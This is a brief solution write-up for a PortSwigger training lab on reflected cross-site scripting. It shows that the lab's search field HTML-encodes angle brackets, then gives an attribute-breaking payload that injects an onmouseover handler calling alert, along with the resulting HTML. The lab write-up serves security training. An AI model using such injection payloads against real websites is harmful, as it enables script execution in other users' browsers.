# [Lab: Reflected XSS into attribute with angle brackets HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded)

## Lab

This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the alert function.

## Analysis

Try input `<>`:

- raw
- url encode
- double url encode

result: `<>` become `&lt;&gt;`

## Solutions

search:

```html
"onmouseover="alert(1)
```

injected to:

```html
<input type=text placeholder='Search the blog...' name=search value=""onmouseover="alert(1)">
```
